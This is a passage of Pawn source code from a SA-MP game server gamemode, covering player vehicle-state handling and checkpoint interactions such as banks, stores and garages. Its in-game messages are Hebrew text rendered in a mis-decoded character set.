		else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 0)
		{
			for(new i=0;i<MAX_PLAYERS_;i++)
			{
				if(IsPlayerConnected(i) && playerinfo[i][work] == work_train && IsPlayerInVehicle(i,GetPlayerVehicleID(playerid)))
				{
					if(GetMoney(playerid) < playerinfo[i][drivecost])
					{
						SendClientMessage(playerid,red," .рщя ьъ юёЇщў ыёє ь°ыс·");
						RemovePlayerFromVehicle(playerid);
					}
					else
					{
						GiveMoney(i,playerinfo[i][drivecost], 8);
						SendClientMessage(i,yellow," !ўщсь· ыёє юфЁхёЄ");
						am = playerinfo[i][drivecost];
						count++;
					}
				}
			}
			if(count > 0)
			{
				format(string,sizeof(string)," .∙щью· %d$ ьЁфт ф°ыс·",am);
				SendClientMessage(playerid,yellow,string);
				GiveMoney(playerid,0-am, 8);
			}
		}
		else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 487)
		{
			for(new i=0;i<MAX_PLAYERS_;i++)
			{
				if(IsPlayerConnected(i) && playerinfo[i][work] == work_pilot && IsPlayerInVehicle(i,GetPlayerVehicleID(playerid)))
				{
					if(GetMoney(playerid) < playerinfo[i][drivecost])
					{
						SendClientMessage(playerid,red," .рщя ьъ юёЇщў ыёє ьшщщё");
						RemovePlayerFromVehicle(playerid);
					}
					else
					{
						GiveMoney(i,playerinfo[i][drivecost], 8);
						SendClientMessage(i,yellow," !ўщсь· ыёє юфЁхёЄ");
						am = playerinfo[i][drivecost];
						count++;
					}
				}
			}
			if(count > 0)
			{
				format(string,sizeof(string)," .∙щью· %d$ ьшщщё",am);
				SendClientMessage(playerid,yellow,string);
				GiveMoney(playerid,0-am, 8);
			}
		}
	}
	if(oldstate == PLAYER_STATE_DRIVER && playerinfo[playerid][work] == work_doctor) ExitWork(playerid," ьр ЁюЎр срюсхьЁё");
	if(oldstate == PLAYER_STATE_DRIVER && playerinfo[playerid][work] == work_taxi) ExitWork(playerid," ьр ЁюЎр сюхЁщ·");
	if(oldstate == PLAYER_STATE_DRIVER && playerinfo[playerid][work] == work_bus) ExitWork(playerid," ьр ЁюЎр срхшхсхё");
	if(oldstate == PLAYER_STATE_DRIVER && playerinfo[playerid][work] == work_train) ExitWork(playerid," ьр ЁюЎр с°ыс·");
	if(oldstate == PLAYER_STATE_DRIVER && playerinfo[playerid][work] == work_pilot) ExitWork(playerid," ьр ЁюЎр сфьщўхЇш°");
	if(oldstate == PLAYER_STATE_DRIVER && playerinfo[playerid][work] == work_icecream) ExitWork(playerid," ьр ЁюЎр срхшх тьщуф");
	if(newstate == PLAYER_STATE_DRIVER)
	{
		new v = GetPlayerVehicleID(playerid);
		if(!playerinfo[playerid][inact] && vehicleinfo[v][vowner] != playerid) switch(GetVehicleModel(v))
		{
			case 447: // SeaSparrow
			{
				if(playerinfo[playerid][level] < 4 && !IsPlayerMAdmin(playerid))
				{
					SendClientMessage(playerid,red," .Єьщъ ьфщх· с°юф 4 ьЇчх· сыущ ьф∙·ю∙ с°ыс цф");
					RemovePlayerFromVehicle(playerid);
				}
			}
			case 432, 425, 520: // Rhino, Hunter, Hydra
			{
				if(playerinfo[playerid][level] < 15 && !IsPlayerMAdmin(playerid))
				{
					SendClientMessage(playerid,red," .Єьщъ ьфщх· с°юф 15 ьЇчх· сыущ ьф∙·ю∙ с°ыс цф");
					RemovePlayerFromVehicle(playerid);
				}
			}
		}
		if(vehicleinfo[v][store])
		{
			if(playerinfo[playerid][vehicle][1] == v)
			{
				format(string,sizeof(string)," Х .∙ьъ " @c(green) "%s" @c(blue) "-с°хъ фср ь",GetVehicleName(GetVehicleModel(v)));
				SendClientMessage(playerid,blue,string);
			}
			if(vehicleinfo[v][onlyview] || playerinfo[playerid][vehicle][1] != v)
			{
				SendClientMessage(playerid,yellow," .ф°ыс фцф ∙щщъ ьчЁх· ф°ысщэ");
				RemovePlayerFromVehicle(playerid);
				if(vehicleinfo[v][onlyview]) format(string,sizeof(string)," .фхр ЁхЄу ь·Ўхтф сьсу хьыя ьр ·хыь ьф∙·ю∙ сх");
				else format(string,sizeof(string)," .хьыя ьр ·хыь ьф∙·ю∙ сх %s фхр ЁўЁф Єь щущ",GetName(vehicleinfo[v][vowner]));
				SendClientMessage(playerid,yellow,string);
			}
		}
		if(vehicleinfo[v][onlyview] == 2) RemovePlayerFromVehicle(playerid);
		if(vehicleinfo[v][vevip] && !playerinfo[playerid][vip])
		{
			SendClientMessage(playerid,red," .ь∙щюх∙ с°ыс цф VIP Єьщъ ьфщх· ю∙·ю∙");
			RemovePlayerFromVehicle(playerid);
		}
		if(vehicleinfo[v][vclan] > 0)
		{
			new vc = vehicleinfo[v][vclan];
			format(string,sizeof(string),playerinfo[playerid][clan] == vc ? (" .(%s) °ыс цф ∙щщъ ьўьря ∙ьъ") : (" .%s °ыс цф ∙щщъ ьўьря"),claninfo[vc][cname]);
			SendClientMessage(playerid,yellow,string);
			if(claninfo[vc][csystems][clansys_lockveh] && claninfo[vc][csystemparam][clansys_lockveh] && playerinfo[playerid][clan] != vc)
			{
				SendClientMessage(playerid,yellow," :сюЇўу· фўьря ЇхЄь· юЄ°ы· фтЁф Єь °ысщ фўьря");
				if(claninfo[playerinfo[playerid][clan]][cpeace][vc]) SendClientMessage(playerid,green," .юрч° хфўьря ∙ьъ с∙ьхэ Єэ фўьря фцф, р·ф щыхь ьф∙·ю∙ с°ыс");
				else if(claninfo[vc][cruler] == playerinfo[playerid][clan]) SendClientMessage(playerid,green," .юрч° хфўьря ∙ьъ ∙хьш сюЇўуф фцх, р·ф щыхь ьф∙·ю∙ с°ыс");
				else
				{
					SendClientMessage(playerid,red," .рщЁъ щыхь ьф∙·ю∙ с°ыс");
					RemovePlayerFromVehicle(playerid);
				}
			}
		}
	}
	if(newstate == PLAYER_STATE_DRIVER && playerinfo[playerid][abf][0]) playerinfo[playerid][abf][1] = GetPlayerVehicleID(playerid);
	if(newstate == PLAYER_STATE_ONFOOT && oldstate == PLAYER_STATE_DRIVER && IsPlayerMAdmin(playerid) && playerinfo[playerid][abf][0] && playerinfo[playerid][abf][1] != INVALID_VEHICLE_ID) PutPlayerInVehicle(playerid,playerinfo[playerid][abf][1],0);
	if(newstate == PLAYER_STATE_ONFOOT && (oldstate == PLAYER_STATE_DRIVER || oldstate == PLAYER_STATE_DRIVER) && playerinfo[playerid][gm] && vehicleinfo[playerinfo[playerid][lastv]][vgm])
	{
		SetVehicleHealth(playerinfo[playerid][lastv],1000.0);
		vehicleinfo[playerinfo[playerid][lastv]][vgm] = 0;
	}
	if(playerinfo[playerid][spectate] != -1 && oldstate == PLAYER_STATE_SPECTATING && newstate == PLAYER_STATE_SPAWNED) LoadPlayerPos(playerid);
	if(!playerinfo[playerid][helmet])
	{
		if((newstate == PLAYER_STATE_DRIVER || newstate == PLAYER_STATE_PASSENGER) && IsBike(GetPlayerVehicleID(playerid)))
		{
			new helm = -1, r = random(5);
			switch(r)
			{
				case 0: helm = 18645;
				default: helm = 18975 + r;
			}
			#define SPAO{%0,%1,%2,%3,%4,%5} SetPlayerAttachedObject(playerid,aoslot_helmet,helm,2,(%0),(%1),(%2),(%3),(%4),(%5));
			switch(GetPlayerSkin(playerid))
			{
				case 0, 65, 74, 149, 208, 273: SPAO{0.070000, 0.000000, 0.000000, 88.000000, 75.000000, 0.000000}
				case 1..6, 8, 14, 16, 22, 27, 29, 33, 41..49, 82..84, 86, 87, 119, 289: SPAO{0.070000, 0.000000, 0.000000, 88.000000, 77.000000, 0.000000}
				case 7, 10: SPAO{0.090000, 0.019999, 0.000000, 88.000000, 90.000000, 0.000000}
				case 9: SPAO{0.059999, 0.019999, 0.000000, 88.000000, 90.000000, 0.000000}
				case 11..13: SPAO{0.070000, 0.019999, 0.000000, 88.000000, 90.000000, 0.000000}
				case 15: SPAO{0.059999, 0.000000, 0.000000, 88.000000, 82.000000, 0.000000}
				case 17..21: SPAO{0.059999, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}
				case 23..26, 28, 30..32, 34..39, 57, 58, 98, 99, 104..118, 120..131: SPAO{0.079999, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}
				case 40: SPAO{0.050000, 0.009999, 0.000000, 88.000000, 82.000000, 0.000000}
				case 50, 100..103, 148, 150..189, 222: SPAO{0.070000, 0.009999, 0.000000, 88.000000, 82.000000, 0.000000}
				case 51..54: SPAO{0.100000, 0.009999, 0.000000, 88.000000, 82.000000, 0.000000}
				case 55, 56, 63, 64, 66..73, 75, 76, 78..81, 133..143, 147, 190..207, 209..219, 221, 247..272, 274..288, 290..293: SPAO{0.070000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}
				case 59..62: SPAO{0.079999, 0.029999, 0.000000, 88.000000, 82.000000, 0.000000}
				case 77: SPAO{0.059999, 0.019999, 0.000000, 87.000000, 82.000000, 0.000000}
				case 85, 88, 89: SPAO{0.070000, 0.039999, 0.000000, 88.000000, 82.000000, 0.000000}
				case 90..97: SPAO{0.050000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}
				case 132: SPAO{0.000000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}
				case 144..146: SPAO{0.090000, 0.000000, 0.000000, 88.000000, 82.000000, 0.000000}
				case 220: SPAO{0.029999, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}
				case 223, 246: SPAO{0.070000, 0.050000, 0.000000, 88.000000, 82.000000, 0.000000}
				case 224..245: SPAO{0.070000, 0.029999, 0.000000, 88.000000, 82.000000, 0.000000}
				case 294: SPAO{0.070000, 0.019999, 0.000000, 91.000000, 84.000000, 0.000000}
				case 295: SPAO{0.050000, 0.019998, 0.000000, 86.000000, 82.000000, 0.000000}
				case 296..298: SPAO{0.064999, 0.009999, 0.000000, 88.000000, 82.000000, 0.000000}
				case 299: SPAO{0.064998, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}
			}
			#undef SPAO
			playerinfo[playerid][helmet] = 1;
		}
	}
	else
	{
		RemovePlayerAttachedObject(playerid,aoslot_helmet);
		playerinfo[playerid][helmet] = 0;
	}
	if(oldstate == PLAYER_STATE_ONFOOT && playerinfo[playerid][spweapon] != spw_none && spAmmunation[playerinfo[playerid][spweapon]][spaObject] && IsPlayerAttachedObjectSlotUsed(playerid,aoslot_spw)) DefineSPWObject(playerid,playerinfo[playerid][spweapon],0);
	if((newstate == PLAYER_STATE_ONFOOT || newstate == PLAYER_STATE_EXIT_VEHICLE) && oldstate == PLAYER_STATE_DRIVER)
	if(playerinfo[playerid][inact] && (raceinfo[0] || kartinfo[0] || monsterinfo[0] || armyinfo[0])) OutOfActivity(playerid);
	if(playerinfo[playerid][waitrace])
	{
		raceinfo[1]--;
		playerinfo[playerid][inrace] = 0;
		playerinfo[playerid][inact] = 0;
		playerinfo[playerid][waitrace] = 0;
		SendClientMessage(playerid,red," .щЎр· юф°ыс ∙рщ·х Ё°∙ю· ьющ°хї хьыя ьр ·∙хт° ьющ°хї");
	}
	if(playerinfo[playerid][ball] > 0) return PutPlayerInVehicle(playerid,playerinfo[playerid][ballv],0);
	if(playerinfo[playerid][inkickstar] && playerinfo[playerid][kickstarprize] && kickstarinfo[0]) playerinfo[playerid][speedup][0] = 0.0, playerinfo[playerid][speedup][1] = 0.0, playerinfo[playerid][speedup][2] = 0.0, playerinfo[playerid][abf][0] = 0, playerinfo[playerid][abf][1] = INVALID_VEHICLE_ID, playerinfo[playerid][kickstarprize] = 0;
	if(manhuntinfo[0] && manhuntinfo[4] == 1 && (newstate == PLAYER_STATE_ONFOOT || newstate == PLAYER_STATE_DRIVER || newstate == PLAYER_STATE_PASSENGER) && manhuntinfo[5] == playerid)
	{
		string = "";
		switch(newstate)
		{
			case PLAYER_STATE_ONFOOT: format(string,sizeof(string)," ** !ы°тЄ фхьъ °ть %s фЁщЎху",GetName(playerid));
			case PLAYER_STATE_DRIVER, PLAYER_STATE_PASSENGER: format(string,sizeof(string)," ** !%s ы°тЄ с°ыс юёхт %s фЁщЎху",GetVehicleName(GetVehicleModel(GetPlayerVehicleID(playerid))),GetName(playerid));
		}
		if(strlen(string) > 0) for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && playerinfo[i][inmanhunt]) SendClientMessage(i,red,string);
	}
	if(oldstate == PLAYER_STATE_DRIVER && playerinfo[playerid][vtemp] != INVALID_VEHICLE_ID)
	{
		DestroyVehicleEx(playerinfo[playerid][vtemp]);
		playerinfo[playerid][vtemp] = INVALID_VEHICLE_ID;
		if(playerinfo[playerid][tdmzone] == tdmz_heavy) playerinfo[playerid][tooktempickup] = 0;
	}
	if(oldstate == PLAYER_STATE_DRIVER && playerinfo[playerid][mission] != INVALID_MISSION_ID) KickMission(playerid,playerinfo[playerid][mission]);
	if(oldstate == PLAYER_STATE_DRIVER && pirateUser[0] == playerid) ReloadPirateShip();
	#if lagtest
		LagTest_End("OnPlayerStateChange");
	#endif
	if(debugstate && !IsPlayerNPC(playerid)) printf("OnPlayerStateChange(%s(%d),%d,%d) end",GetName(playerid),playerid,newstate,oldstate);
	return 0;
}
//=[OnPlayerEnterCheckpoint]====================================================
public OnPlayerEnterCheckpoint(playerid)
{
	if(debugstate) printf("OnPlayerEnterCheckpoint(%s(%d)) start",GetName(playerid),playerid);
	Streamer_CallbackHook(STREAMER_OPEC,playerid);
	if(IsPlayerNPC(playerid)) return 1;
	if(playerinfo[playerid][spectate] != -1) return 1;
	#if lagtest
		LagTest_Start("OnPlayerEnterCheckpoint");
	#endif
	new string[M_S];
	if(playerinfo[playerid][specp]) playerinfo[playerid][specp] = 0;
	if(playerinfo[playerid][inarea51])
	{
		SetPlayerPos(playerid,153.0269 + floatrand(-20.0,20.0),1912.9372 + floatrand(-20.0,20.0),695.3936);
		if(!playerinfo[playerid][inbriefcase])
		{
			LoadPlayerWeapons(playerid);
			SetPlayerVirtualWorld(playerid,world_normal);
		}
		SetPlayerInterior(playerid,0);
		DisablePlayerCheckpoint(playerid);
		LoadPlayerWeapons(playerid);
		GiveWeapon(playerid,46,0);
		SetPlayerArmedWeapon(playerid,46);
		playerinfo[playerid][inarea51] = 0;
		SendClientMessage(playerid,darkblue," !ЎЁщчф юфЁф");
	}
	if(playerinfo[playerid][inplane])
	{
		new Float:p[3];
		GetVehiclePos(npcVehicles[3],p[0],p[1],p[2]);
		SetPlayerPos(playerid,p[0],p[1],p[2]-5.0);
		SetPlayerVirtualWorld(playerid,world_normal);
		SetPlayerInterior(playerid,0);
		DisablePlayerCheckpoint(playerid);
		LoadPlayerWeapons(playerid);
		GiveWeapon(playerid,46,0);
		SetPlayerArmedWeapon(playerid,46);
		playerinfo[playerid][inplane] = 0;
		SendClientMessage(playerid,darkblue," !ЎЁщчф юфЁф");
	}
	if(playerinfo[playerid][inshooting] != -1)
	{
		format(string,sizeof(string),"Shooting-%d",playerinfo[playerid][instunting]);
		if(!playerinfo[playerid][doneshooting][playerinfo[playerid][inshooting]] && !Reward_Check(playerid,string))
		{
			Reward_Give(playerid,string);
			GiveMoney(playerid,15,34);
			playerinfo[playerid][doneshooting][playerinfo[playerid][inshooting]] = 1;
			new bool:doneall = true;
			for(new i = 0; i < sizeof(Shooting) && doneall; i++) if(!playerinfo[playerid][doneshooting][i]) doneall = false;
			if(doneall) ObjectiveComplete(playerid,objective_shooter);
		}
		format(string,sizeof(string)," Х /shooting ?фЎьщч ьЄсх° р· рцх° фўьщЄф ьюш°ф юёЇ° #%d! °хЎщэ ьЁёх· %s",playerinfo[playerid][inshooting] + 1,GetName(playerid));
		SendClientMessageToAll(green,string);
		LoadPlayerWeapons(playerid);
		SpawnPlayer(playerid);
		playerinfo[playerid][inshooting] = -1;
		DisablePlayerCheckpoint(playerid);
	}
	if(playerinfo[playerid][hell])
	{
		playerinfo[playerid][hell] = 0;
		SendClientMessage(playerid,white," !DM с°хъ фср ью∙°у щ∙щсх· фЎхх· ∙ь");
		SetPlayerPos(playerid,1037.8976,6.3981,1001.2845);
		SetPlayerFacingAngle(playerid,179.2593);
		SetPlayerInterior(playerid,3);
	}
	if(playerinfo[playerid][incp] == 0)
	{
		switch(GetPlayerCheckpoint(playerid))
		{
			case cp_bank:
			{
				SendClientMessage(playerid,lightpurple," ╗ !с°хыщэ фсрщэ ьсЁў");
				SendClientMessage(playerid,yellow," .ыря ·хыь ь∙юх° р· ыёЇъ ыъ ∙щ∙ю° тэ рэ ·Ўр юфю∙чў! ф∙·ю∙ с·Ї°щш ∙ьЇЁщъ ыущ ьсчх° ЇЄхьф");
				ShowPlayerConstDialog(playerid,dialog_bank);
				if(playerinfo[playerid][gang] > 0)
				{
					SendClientMessage(playerid,orange," :∙щэ ьс: стьь ∙р·ф сыЁхЇщщф, р·ф щыхь ь∙юх° ыёє ссЁў фыЁхЇщщф фЇ°шщ");
					SendClientMessage(playerid,yellow," /gdeposit Х /gwithdraw Х /gbalance Х /gdepositall Х /gwithdrawall");
				}
				command(playerid,"/balance");
			}
			case cp_ammu:
			{
				SendClientMessage(playerid,lightpurple," ╗ !с°хыщэ фсрщэ ьчЁх· фЁ∙ўщэ");
				SendClientMessage(playerid,orange," .ыря ·хыь ьўЁх· Ё∙ўщэ ∙щщ∙ю°х тэ ьрч° ∙·юх· рх ·Ўр юфю∙чў! ф∙·ю∙ с·Ї°щш ∙ьЇЁщъ ыущ ьсчх° ЇЄхьф");
				if(playerinfo[playerid][level] == 1)
				{
					SendClientMessage(playerid,red," .∙щэ ьс: р·ф с°юф Ёюхыф ы°тЄ, ьыя ьр ·хыь ьўЁх· р· °хс фЁ∙ўщэ");
					SendClientMessage(playerid,red," /DM :рЁх ююьщЎщэ ьфыЁё ьрчу юрцх°щ фущ-рэ ыущ ьЄьх· ь°юф фсрф хьф·чщь ьўЁх· Ё∙ўщэ чцўщэ");
				}
				ShowPlayerConstDialog(playerid,dialog_ammu);
				if(ammusale[0] > ammusale_none)
				{
					SendClientMessage(playerid,lightgreen," ~ :Єы∙щх счЁх· фЁ∙ўщэ, юсЎЄ ~");
					SendClientMessage(playerid,lightgreen,AmmunationSaleName());
				}
			}
			case cp_castle:
			{
				new a = playerinfo[playerid][castle];
				if(cainfo[a][caCapture] != playerinfo[playerid][clan]) return SendClientMessage(playerid,red," .°ў ∙ьщшщ фшщ°ф щыхьщэ ьф∙·ю∙ сю∙т° фшщьщэ");
				SendClientMessage(playerid,white,"/Launch :с°хъ фср ью∙т° фшщьщэ, ь∙щюх∙ сю∙т° ф∙·ю∙ сЇўхуф");
				SendClientMessage(playerid,grey," ( Х /hqlist - ь°∙щю· фюЇўух· фЄуыЁщ· ∙ь ф∙°· фўьу р· фЇўхуф )");
			}
			case cp_furnitures:
			{
 				new list[360];
				for(new _i = 0; _i < 10; _i++) format(list,sizeof(list),"%s%s (Categories: %d)\n",list,FurnituresCategoriesInfo[_i][hcName],FurnituresCategoriesInfo[_i][hcCategories]);
				ShowPlayerDialog(playerid,dialog_furnitures,DIALOG_STYLE_LIST,@c(lightblue) "Furnitures - °фщшщэ",list,"ыЁщёф","сщшхь");
			}
			case cp_wang:
			{
				if(wangv == -1) return SendClientMessage(playerid,red," .юхёъ ххрЁт ьр ючЇ∙ ∙хэ °ыс ы°тЄ");
				if(IsPlayerInAnyVehicle(playerid))
				{
					if(GetVehicleModel(GetPlayerVehicleID(playerid)) == GetVehicleModel(wangv))
					{
						new pay = (randomEx(4,9)*30);
						format(string,sizeof(string)," !ьюхёъ ххрЁт хўщсь $%d %s юы° р· ф°ыс %s",pay,GetVehicleName(GetVehicleModel(wangv)),GetName(playerid));
						SendClientMessage(playerid,green,string);
						GiveMoney(playerid,pay,34);
						SetVehicleToRespawn(GetPlayerVehicleID(playerid));
						wangv = -1;
					}
					else
					{
						format(string,sizeof(string)," .%s ьр ,%s юхёъ ххрЁт ючЇ∙",GetVehicleName(GetVehicleModel(GetPlayerVehicleID(playerid))),GetVehicleName(GetVehicleModel(wangv)));
						SendClientMessage(playerid,red,string);
					}
				}
				else
				{
					format(string,sizeof(string)," .%s юхёъ ххрЁт ючЇ∙",GetVehicleName(GetVehicleModel(wangv)));
					SendClientMessage(playerid,green,string);
				}
			}
			case cp_sammu:
			{
				SendClientMessage(playerid,lightpurple," ╗ !с°хыщэ фсрщэ ьчЁх· фЁ∙ўщэ фёхущ·");
				SendClientMessage(playerid,orange," .ыря ·хыь ьўЁх· Ё∙ўщэ сючщ°щэ цхьщэ. фЁ∙ўщэ ьр щ∙ю°х ьрч° ∙·юх·");
				SendClientMessage(playerid,yellow," :Їўхух· чЁх· Ё∙ўщэ ёхущ· рЇ∙°щх·");
				SendClientMessage(playerid,yellow," /sbw Х /swl Х /ccsbw");
			}
			/*case cp_cbank:
			{
				format(string,sizeof(string)," ╗ !%s с°хыщэ фсрщэ ьсЁў фЇ°шщ ∙ь фўьря",claninfo[cpinfo[playerinfo[playerid][cp]][cppar]][cname]);
				SendClientMessage(playerid,lightpurple,string);
				if(playerinfo[playerid][clan] == 0) SendClientMessage(playerid,red," .р·ф ьр сўьря хьыя рщЁъ щыхь ьф∙·ю∙ ссЁўщ ўьрЁщэ");
				else if(cpinfo[playerinfo[playerid][cp]][cppar] == playerinfo[playerid][clan])
				{
					SendClientMessage(playerid,orange," :ыря ·хыь ь∙юх° ыёє ьўьря ∙ьъ ∙щфщф ю∙х·є Єэ ыь чс°щ фўьря ∙ьъ. ф∙·ю∙ сЇўхух· фсрх·");
					SendClientMessage(playerid,yellow," /cdeposit Х /cwithdraw Х /cbalance Х /cdepositall Х /cwithdrawall");
				}
				else SendClientMessage(playerid,red," .сЁў цф ьр ∙щщъ ьўьря ∙ьъ хьыя ьр ·хыь ьф∙·ю∙ сх");
			}*/
			case cp_vgarage:
			{
				if(!playerinfo[playerid][vip]) return SendClientMessage(playerid,red," .ь∙щюх∙ сюхёъ цф VIP Єьщъ ьфщх· ю∙·ю∙");
				if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid,red," .Єьщъ ьфщх· с°ыс");
				if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SendClientMessage(playerid,red," .Єьщъ ьфщх· фЁфт");
				SendClientMessage(playerid,green," !ф°ыс ўщсь ∙щЇх°");
				/*new v = GetPlayerVehicleID(playerid), rnd = random(127), Float:lastvp[4], lastvm = GetVehicleModel(GetPlayerVehicleID(playerid));
				GetVehiclePos(v,lastvp[0],lastvp[1],lastvp[2]);
				GetVehicleZAngle(v,lastvp[3]);
				DestroyVehicleEx(v);
				v = CreateVehicleEx(lastvm,lastvp[0],lastvp[1],lastvp[2],lastvp[3],!random(2) ? random(127) : rnd,!random(2) ? random(127) : rnd);
				SetVehicleHealth(v,1000.0); Fixed by RepairVehicle */
				new v = GetPlayerVehicleID(playerid), Float:ang;
				RepairVehicle(v);
				GetVehicleZAngle(v,ang);
				SetVehicleZAngle(v,ang + 180.0);
				if(!GetVehicleType(v))
				{
					ChangeVehiclePaintjob(v,randomEx(1,4));
					if(GetVehicleComponentInSlot(v,CARMODTYPE_HYDRAULICS) < 1000) AddVehicleComponent(v,1087,playerid);
					if(GetVehicleComponentInSlot(v,CARMODTYPE_WHEELS) < 1000) AddVehicleComponent(v,1076,playerid);
				}
				if((!GetVehicleType(v) || GetVehicleType(v) == 3 || GetVehicleType(v) == 4) && GetVehicleComponentInSlot(v,CARMODTYPE_NITRO) < 1000) AddVehicleComponent(v,1010,playerid);
				//PutPlayerInVehicle(playerid,v,0);
			}
			case cp_bar:
			{
				SendClientMessage(playerid,lightpurple," ╗ !с°хыщэ фсрщэ ьс°");
				SendClientMessage(playerid,orange," (: .ыря ·хыьх ьўЁх· ю∙ўрх· ∙щщт°юх ьыэ ьфщх· ∙щых°щэ");
				SendClientMessage(playerid,orange," /blist Х /bbuy :ф∙·ю∙х сЇўхух·");
			}
			case cp_vstore:
			{
				format(string,sizeof(string)," ╗ !с°хыщэ фсрщэ ьчЁх· ф%s",cpinfo[playerinfo[playerid][cp]][cpname]);
				SendClientMessage(playerid,lightpurple,string);
				SendClientMessage(playerid,orange," !ыря ·хыьх ьўЁх· ыьщ °ыс Ї°шщ ∙·хыьх ьф∙·ю∙ сх сыь цюя ∙·°Ўх");
				SendClientMessage(playerid,orange," /vlist :·Ї°щш ф°ысщэ сЇўхуф рч·");
			}
			case cp_phone: if(GetPlayerState(playerid) == PLAYER_STATE_ONFOOT)
			{
				SendClientMessage(playerid,lightblue," Х !с°хыщэ фсрщэ ьшьЇхя фЎщсх°щ");
				SendClientMessage(playerid,orange," Х /pcall - Єь юЁ· ьф·ў∙° ь∙чўя");
				SendClientMessage(playerid,orange," Х /hangup - Єь юЁ· ьЁ·ў ∙щчф");
			}
			case cp_atm: if(GetPlayerState(playerid) == PLAYER_STATE_ONFOOT)
			{
				SendClientMessage(playerid,lightblue," Х !с°хыщэ фсрщэ ьыёЇхюш");
				if(!playerinfo[playerid][ccard]) SendClientMessage(playerid,red," .рщя ьъ ы°шщё р∙°рщ хьыя ьр ·хыь ьф∙·ю∙ сыёЇхюш. ·хыь ьўЁх· ы°шщё ыцф ссЁў");
				else
				{
					SendClientMessage(playerid,green," .ыря ·хыь ьфхЎщр ыёє");
					ShowPlayerDialog(playerid,dialog_atm,DIALOG_STYLE_LIST," рЇ∙°хщх· ыёЇхюш","фхЎр ыёє\nфхЎр р· ыь фыёє юч∙схя фсЁў\nсухў р· юрця ч∙схя фсЁў","сч°","ётх°");
				}
			}
			case cp_sgarage:
			{
				if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid,red," .Єьщъ ьфщх· с°ыс");
				if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SendClientMessage(playerid,red," .Єьщъ ьфщх· фЁфт");
				if(GetVehicleType(GetPlayerVehicleID(playerid)) == 1 || GetVehicleType(GetPlayerVehicleID(playerid)) == 2 || GetVehicleType(GetPlayerVehicleID(playerid)) == 4) return SendClientMessage(playerid,red," .ьр Ёщ·я ьф·ўщя ∙щЇх° ь°ыс цф");
				if(playerinfo[playerid][sgcomp] != -1) return SendClientMessage(playerid,red," .юыщххя ∙ыс° щ∙ ьъ ∙щЇх°, ьр ·хыь ьўЁх· ∙щЇх° Ёхёє. ыущ ьючхў р· ф∙щЇх° щ∙ ьЎр· юф°ыс");
				SendClientMessage(playerid,lightpurple," ╗ !с°хыщэ фсрщэ ьюхёъ ф∙щЇх°щэ фющхчущэ");
				SendClientMessage(playerid,green," .юхёъ цф юрЇ∙° ьъ ь∙Ї° р· ф°ыс ∙ьъ Єэ ∙щЇх°щэ ющхчущэ сющЁэ. ∙щэ ьс: ф∙щЇх°щэ Ёючўщэ ы∙р·ф щхЎр юф°ыс");
				SetTimerEx("ShowSGarageMenu",500,0,"i",playerid);
				SetVehicleVelocity(GetPlayerVehicleID(playerid),0.0,0.0,0.0);
				SetFreeze(playerid,1);
				SetFreeze(playerid,0);
				command(playerid,"/sclist");
				SendClientMessage(playerid,purple," /Mode 77 :ьющуЄ Ёхёє Єь юЄ°ы· цх");
			}
			case cp_lighthouse:
			{
				if(playerinfo[playerid][lhopt] != -1) return 1;
				if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendClientMessage(playerid,red," .рщЁъ щыхь ьф∙·ю∙ сютуьх° сюЎсъ фЁхычщ");
				SendClientMessage(playerid,lightpurple," ╗ !с°хыщэ фсрщэ ьютуьх°");
				SendClientMessage(playerid,yellow," .ыря Ёщ·я ьсЎЄ Їўхух· фў∙х°х· ьыь фюЇф ∙ь фю∙чў");
				ShowPlayerDialog(playerid,dialog_lighthouse,DIALOG_STYLE_LIST,@c(lightblue) "фютуьх°","юЎщр· °ыс\nюЎщр· Ё∙ў\nюЄьщ· фюЇўух·\n" @c(red) "(!∙щэ ьс: ∙щюх∙ сюЄьщ· фюЇўух· Єхьф 500$)","ф∙·ю∙","ётх°");
			}
			case cp_abank:
			{
				SendClientMessage(playerid,lightpurple," ╗ !с°хыщэ фсрщэ ьсЁў фрующЁщэ");
				if(playerinfo[playerid][admin] < 2) return SendClientMessage(playerid,red," !фсЁў ю∙ю∙ рующЁщэ ю°юх· 2 хюЄьф сьсу");
				SendClientMessage(playerid,orange," /abank :ь∙щюх∙ ссЁў фрующЁщэ ф∙·ю∙ сЇўхуф");
			}
			case cp_gambling:
			{
				ShowPlayerDialog(playerid, dialog_gamble, DIALOG_STYLE_LIST, "Gambling:", @c(red)"X2 фщюх°\n"@c(yellow)"Jackpot", "фю∙ъ", "сщшхь");
			}
			case cp_store:
			{
				format(string,sizeof(string)," ╗ !с°хыщэ фсрщэ ь%s",cpinfo[playerinfo[playerid][cp]][cpname]);
				SendClientMessage(playerid,lightpurple,string);
				switch(cpinfo[playerinfo[playerid][cp]][cppar])
				{
					case store_clothes:
					{
						SendClientMessage(playerid,orange," /myskin :ыря ·хыь ьфчьщє уюх· юсьщ ьюх·. ф∙·ю∙ сЇўхуф");
						SendClientMessage(playerid,orange," /clothes :ьыь фрЇ∙°хщх·");
						command(playerid,"/clothes");
					}
					case store_pets:
					{
						SendClientMessage(playerid,orange," .ыря ·хыь ьўЁх· чщх· ∙щЄц°х хщьхх рх·ъ сў°сх·. ·хыь ьЄ∙х· ёщсхс хь°рх· юф ∙ххф ыь чщф");
						format(talkBubble,sizeof(talkBubble),"ыря ·хыь ьўЁх· сЄьщ чщщэ ∙щЄц°х ьъ сў°сх·");
						NPCTalk("DM_PetShop","ыря ·хыь ьўЁх· сЄьщ чщщэ ∙щЄц°х ьъ сў°сх·",playerid,1,1);
						command(playerid,"/pets");
					}
					case store_bombs:
					{
						SendClientMessage(playerid,orange," /buybomb :ыря ·хыь ьўЁх· ЇЎЎх· ∙хЁх· Єэ фЇўхуф");
